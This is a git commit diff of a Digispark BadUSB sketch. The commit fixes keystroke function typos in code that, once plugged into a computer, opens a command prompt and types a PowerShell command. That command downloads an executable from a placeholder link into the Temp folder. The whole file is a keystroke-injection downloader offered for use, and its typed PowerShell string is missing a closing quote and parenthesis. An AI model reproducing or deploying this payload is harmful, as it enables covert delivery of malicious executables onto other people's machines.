9de4b9c1e3bafcfec56e1f15a340a461e2e821b0
Slizarenlook <43479126+Slizarenlook@users.noreply.github.com>
2019-03-03 16:06:22 +0300

    Update digispark_downloadboard.ino

--- digispark_downloadboard.ino
+++ digispark_downloadboard.ino
@@ -4,14 +4,14 @@
 void setup() {
   // put your setup code here, to run once:
 DigiKeyboard.delay(1000);
-DigiKeyboard.sendKeyStoke(0, MOD_GUI_LEFT); 
+DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT); 
 DigiKeyboard.delay(1000);
 DigiKeyboard.print(F("cmd"));
 DigiKeyboard.delay(1000);
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(1000);
 DigiKeyboard.print(F("powershell (new-object System.Net.WebClient).DownloadFile('link on file, that you want to be downloaded','%Temp%/end 2.exe"));
-DigiKeyboard.sendKeySroke(KEY_ENTER);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(2000);
 DigiKeyboard.print(F("exit"));
 }
